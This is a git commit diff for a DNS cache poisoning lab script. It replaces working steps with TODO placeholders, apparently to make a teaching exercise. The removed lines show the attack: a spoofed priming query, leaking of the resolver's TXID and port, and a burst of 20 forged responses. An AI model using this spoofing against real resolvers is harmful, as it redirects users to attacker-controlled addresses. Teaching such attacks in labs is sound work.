78a125ea2ea8ee8a8e86cdb09c72ea9fa752db1d
Usioumeo <alessio.zeni01@gmail.com>
2026-04-27 20:29:01 +0200

    poisoning holes

--- attacks/challenges/attack_cache_poisoning.py
+++ attacks/challenges/attack_cache_poisoning.py
@@ -7,25 +7,30 @@ from common_library import *
 
 
 print("[*] 0. First query, just to get the resolver to cache the NS record for example.com...")
-dns_loader = build_spoofed_dns_request(attacker_ip, 12345, 53, "example.com.", "NS")
+#TODO make a query for example.com to get the resolver to cache the NS record for example.com,
+# this will make our attack more reliable,
+# since the resolver will not need to query the authoritative server mid attack.
+
+#END TODO
 ans = sr1(dns_loader, timeout=10, verbose=0)
 print(ans.show() if ans else "No answer received")
 
 
 print("[*] 1. Leaking resolver TXID/port via controlled domain...")
-leaked_txid, target_port = sniff_port_and_txid(5)
+#TODO leak the TXID and source port
+
+#END TODO 
+to_send =[]
+#TODO build the trigger query and 20 spoofed responses, using the leaked TXID and port.
+# Make sure to increment the TXID for each response, since the resolver will increment the TXID for each retry.
+# insert the pprebuilt query in the to_send list.
 
 
+#END TODO
 
-trigger_query = build_spoofed_dns_request(attacker_ip, 12345, 53, "www.example.com.", "A")
-#prebuild query to speed up the attack, since we need to send 20 responses as fast as possible
-to_send =[trigger_query]
-for i in range(1, 21):
-    pkt = build_spoofed_dns_response((leaked_txid + i) % 65536, target_port, fake_ip, qname="www.example.com.", qtype='A')
-    to_send.append(pkt)
+
 
 print("[*] 2. Sending and spoofing responses.")
-#send(trigger_query, verbose=0)
 send(to_send, verbose=0)
 
 
